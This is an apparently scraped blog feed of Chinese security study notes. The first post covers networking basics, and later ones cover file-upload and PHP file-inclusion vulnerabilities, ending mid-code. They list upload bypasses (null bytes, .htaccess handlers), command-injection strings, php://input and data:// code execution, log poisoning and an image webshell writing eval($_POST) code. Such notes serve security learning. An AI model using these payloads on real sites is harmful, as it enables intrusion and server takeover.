alt="image-20200615185534103"></p><p>数据链路层信道类型：点到点和广播。</p><p>链路：是一条点到点的物理线路段。</p><p>数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。</p><p>帧：帧头 帧尾 mac地址 校验码</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p><h3 id="0x02数据链路层的三个基本问题"><a href="#0x02数据链路层的三个基本问题" class="headerlink" title="0x02数据链路层的三个基本问题"></a>0x02数据链路层的三个基本问题</h3><p>1.封装成帧</p><p>2.透明传输（将转义字符转义）</p><p>3.差错控制</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p><p>传的数据为<strong>101001001</strong>/1101余数为0就会接受。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p><h3 id="0x03两种情况下的数据链路层"><a href="#0x03两种情况下的数据链路层" class="headerlink" title="0x03两种情况下的数据链路层"></a>0x03两种情况下的数据链路层</h3><p><strong>点到点信道的数据链路层</strong>（广域网）</p><p>PPP协议</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p><p><strong>广播信道的数据链路层</strong>（集线器）</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p><h3 id="0x04以太网"><a href="#0x04以太网" class="headerlink" title="0x04以太网"></a>0x04以太网</h3><p>以太网是一种CSMA/CD的局域网</p><p><strong>媒体接入控制层</strong>（MAC ）</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p><p>FCS抓包之后会删掉。</p><h3 id="0x05扩展以太网"><a href="#0x05扩展以太网" class="headerlink" title="0x05扩展以太网"></a>0x05扩展以太网</h3><p>集线器级联，会使网络中计算机数量增加，但会使冲突域增大，如何优化呢？</p><p><strong>网桥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p><p>网桥就是交换机的前身，交换机相当于网桥和集线器。</p><h3 id="0x06高速以太网"><a href="#0x06高速以太网" class="headerlink" title="0x06高速以太网"></a>0x06高速以太网</h3><h2 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h2><h3 id="0x01网络层提供的服务"><a href="#0x01网络层提供的服务" class="headerlink" title="0x01网络层提供的服务"></a>0x01网络层提供的服务</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p><p>（路由器是网络层设备）</p><p>网络地址相同就可以看成一个<strong>网段</strong>，怎么看网络地址呢？可以看子网掩码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">子网掩码:255.0.0.0</span><br><span class="line">&#x2F;&#x2F;此时，我们可以看出子网掩码是255，那表明ip地址中10就是网络地址。</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">子网掩码255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0说明在这个网段中12.0是网络地址</span><br><span class="line"></span><br><span class="line">网关：路由器上配置，一般为该网段中的第一个地址，实际上任意一个地址都可以。</span><br><span class="line"></span><br><span class="line">路由器：路由器是无法知道它具体网段的位置，需要添加路由表。</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p><h3 id="0x02网络设备和OSI参考模型"><a href="#0x02网络设备和OSI参考模型" class="headerlink" title="0x02网络设备和OSI参考模型"></a>0x02网络设备和OSI参考模型</h3><p>发送端：</p><ol><li><p>应用层 程序准备要传输的文件</p></li><li><p>传输层 将文件编号</p></li><li><p>网络层 添加IP地址</p></li><li><p>数据链路层  有两种情况 </p><p>第一种 通过子网掩码 ，判断是否是同一个网段。如果是，利用ARP协议广播解析目标ip地址的MAC地址</p><p>第二种</p></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p><h3 id="0x03网络层协议"><a href="#0x03网络层协议" class="headerlink" title="0x03网络层协议"></a>0x03网络层协议</h3><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a><strong>ARP协议</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;查询mac地址</span><br><span class="line">arp -s ip地址 mac地址   &#x2F;&#x2F;配置IP地址的MAC地址</span><br></pre></td></tr></table></figure><p>arp协议:将ip地址通过广播 目标MAC地址是FF-FF-FF-FF-FF-FF<strong>解析目标ip地址的MAC地址</strong></p><p>arp欺骗: 数据链路层故障，缓存了错误的MAC地址</p><h4 id="网际控制报文协议（ICMP）"><a href="#网际控制报文协议（ICMP）" class="headerlink" title="网际控制报文协议（ICMP）"></a><strong>网际控制报文协议</strong>（ICMP）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">128 windows</span><br><span class="line">255 unix</span><br><span class="line">ping www.baidu.com -t    一直ping</span><br><span class="line">ping www.baidu.com -l 200   定义数据包的大小</span><br><span class="line">&#x2F;&#x2F;查看路由器的地址</span><br><span class="line">ping 8.8.8.8 -i 1 更改数据包ttl时间，可以跟踪途经的路由器</span><br><span class="line">pathping   跟踪ping的路径</span><br><span class="line">tracert    直接跟踪路由</span><br></pre></td></tr></table></figure><h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>配置在路由器上扫描多播地址的协议</p><p>广播：目标ip地址是全ff，目标mac地址是255，向局域网内所有计算机发出广播</p><p>点到点：从一个点到另一个点</p><p>组播：一对多</p><h3 id="0x04数据包"><a href="#0x04数据包" class="headerlink" title="0x04数据包"></a>0x04数据包</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p><p>版本：用来表示TCP/IP协议的版本 v4 v6</p><p>区分服务：看谁的优先级高</p><p>标识：100 100 100就为一个数据包</p><p>标志：看数据包是否分片<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p><p>生存时间（TTL）：每过一个路由器，生存时间会修改。</p><p>协议号：交给哪个协议进行处理</p><p>（ICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89）</p><p>数据链路层支持数据包1500字节</p><p>IP层支持数据包是65535字节，所以需要分片传输，但一般不会超过1500字节。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p><p><strong>Active Mode</strong></p><p>第二信道是服务器主动发起的。</p><p>第一信道是21端口</p><p>第二信道是20端口</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p><p><strong>Passive</strong></p><p>第一信道是21端口</p><p>第二信道是随机端口</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p><h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p><p><strong>telnet</strong>的端口是23端口</p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个只有这一部分了&lt;/p&gt;
&lt;p&gt;后面学了但好像丢了&lt;/p&gt;
&lt;p&gt;看多会学到计网时，再来补这一篇&lt;/p&gt;
&lt;h1 id=&quot;计网初学&quot;&gt;&lt;a href=&quot;#计网初学&quot; class=&quot;headerlink&quot; title=&quot;计网初学&quot;&gt;&lt;/a&gt;计网初学&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="计网" scheme="https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-12-09T15:26:33.000Z</published>
    <updated>2020-12-09T15:27:06.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p><h2 id="0x01基本流程"><a href="#0x01基本流程" class="headerlink" title="0x01基本流程"></a>0x01基本流程</h2><ol><li>图片是否正常上传。</li><li>图片上传内容是否被感染。（内容替换 抓包改）</li><li>上传的域名是否是目标服务器。</li><li>上传的目录是否支持解析</li></ol><h2 id="0x02绕过js"><a href="#0x02绕过js" class="headerlink" title="0x02绕过js"></a>0x02绕过js</h2><h2 id="0x03文件上传空字节"><a href="#0x03文件上传空字节" class="headerlink" title="0x03文件上传空字节"></a>0x03文件上传空字节</h2><p>抓包的时候 %00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x04文件上传名单验证"><a href="#0x04文件上传名单验证" class="headerlink" title="0x04文件上传名单验证"></a>0x04文件上传名单验证</h2><p>黑名单：不允许什么上传</p><p>白名单：允许什么上传</p><p>可以尝试php3 php4 php5 phtml，pht使用  或服务器解析漏洞</p><h2 id="0x05二次上传"><a href="#0x05二次上传" class="headerlink" title="0x05二次上传"></a>0x05二次上传</h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-type中表示了文件类型。</p><h2 id="0x07解析漏洞"><a href="#0x07解析漏洞" class="headerlink" title="0x07解析漏洞"></a>0x07解析漏洞</h2><h3 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p><h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p><h3 id="net上传"><a href="#net上传" class="headerlink" title=".net上传"></a>.net上传</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p><h3 id="phtml上传"><a href="#phtml上传" class="headerlink" title="phtml上传"></a>phtml上传</h3><p>在apache配置文件中添加（httpd.conf）中添加</p><p>AddType application/x-httpd-php.phtml</p><p>这样phtml后缀的文件就会按照php去解析</p><h3 id="htaccess上传"><a href="#htaccess上传" class="headerlink" title=".htaccess上传"></a>.htaccess上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;会将所有的jpg文件都按照php来解析</span><br></pre></td></tr></table></figure><h2 id="0x08双文件上传"><a href="#0x08双文件上传" class="headerlink" title="0x08双文件上传"></a>0x08双文件上传</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;上传漏洞&quot;&gt;&lt;a href=&quot;#上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;上传漏洞&quot;&gt;&lt;/a&gt;上传漏洞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-12-09T15:21:27.000Z</published>
    <updated>2020-12-09T15:23:42.040Z</updated>
    
    <content type="html"><![CDATA[<p>今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="0x01定义"><a href="#0x01定义" class="headerlink" title="0x01定义"></a>0x01定义</h2><p>在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。</p><h2 id="0x02环境要求"><a href="#0x02环境要求" class="headerlink" title="0x02环境要求"></a>0x02环境要求</h2><ul><li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li><li>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</li></ul><h2 id="0x03文件包含函数"><a href="#0x03文件包含函数" class="headerlink" title="0x03文件包含函数"></a>0x03文件包含函数</h2><ul><li>include():可获得指定文件中的所有文本，并把文本拷贝到使用 include 函数的文件中。include() 函数<strong>会生成一个警告，但是脚本会继续执行。</strong></li><li>require():函数接受的所有文本文件,并将它复制到指定的文件中，使用了包括功能。如果在加载一个文件时有任何问题，<strong>生成一个致命错误,停止脚本的执行。</strong></li></ul><h2 id="0x04命令执行"><a href="#0x04命令执行" class="headerlink" title="0x04命令执行"></a>0x04命令执行</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、</p><p>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令</p><p>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li><p>应用调用执行系统命令的函数</p></li><li><p>将用户输入作为系统命令的参数拼接到了命令行中</p></li><li><p>没有对用户输入进行过滤或过滤不严</p></li></ul><hr><h3 id="常用连接符"><a href="#常用连接符" class="headerlink" title="常用连接符"></a>常用连接符</h3><ul><li>在Windows和Linux中我们可以使用<strong>&amp;来执行多条命令。</strong></li><li><strong>|</strong>：前面命令输出结果作为后面命令的输入内容；输入8.8.8.8|whoami </li><li><strong>||</strong>：前面命令执行失败的时候才执行后面的命令</li><li><strong>&amp;&amp;</strong>：前面命令执行成功了才执行后面的命令</li><li>在Linux中还可以用；号来连接。</li></ul><h3 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h3><ul><li><p>system：成功执行返回结果的最后一行，否则返回FALSE</p></li><li><p>exec：成功执行返回结果的最后一行</p></li><li><p>shell_exec：成功执行返回全部结果，否则返回NULL</p></li><li><p>passthru ：把命令的运行结果原样地直接输出到标准输出设备上</p></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>读取指定目录内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure><p><strong>读取指定文件内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure><hr><h2 id="0x05php伪协议"><a href="#0x05php伪协议" class="headerlink" title="0x05php伪协议"></a>0x05php伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</strong>当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p><p>在ctf中，php://input用于执行php代码。</p><p>通常会有两种类型：</p><ol><li>任意代码执行</li><li>文件内容绕过</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</span><br><span class="line"></span><br><span class="line">由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</span><br></pre></td></tr></table></figure><h3 id="data-和phar"><a href="#data-和phar" class="headerlink" title="data://和phar://"></a>data://和phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p><h2 id="0x06包含Apache日志文件"><a href="#0x06包含Apache日志文件" class="headerlink" title="0x06包含Apache日志文件"></a>0x06包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p><p>利用条件：</p><ul><li>对日志文件可读</li><li>知道日志文件的存储目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。</span><br><span class="line">  如果访问一个不存在的资源时，如http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt; 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</span><br></pre></td></tr></table></figure><h2 id="0x07包含SESSION"><a href="#0x07包含SESSION" class="headerlink" title="0x07包含SESSION"></a>0x07包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p>利用条件：</p><ol><li>找到SESSION内的可控变量</li><li>SESSION文件可读写，并且知道存储路径</li></ol><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><h2 id="0x08包含临时文件"><a href="#0x08包含临时文件" class="headerlink" title="0x08包含临时文件"></a>0x08包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><h2 id="0x09包含上传文件"><a href="#0x09包含上传文件" class="headerlink" title="0x09包含上传文件"></a>0x09包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">图片马的制作方式如下，在cmd控制台下输入：</span><br><span class="line"></span><br><span class="line">进入1.jpg和2.php的文件目录后，执行：</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">图片代码如下：</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">然后访问URL：http:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="0x10指定前缀绕过"><a href="#0x10指定前缀绕过" class="headerlink" title="0x10指定前缀绕过"></a>0x10指定前缀绕过</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>使用../../返回上一目录，称为目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//前缀</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol><li><p>url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure></li><li><p>二次编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure></li><li><p>容器/服务器编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 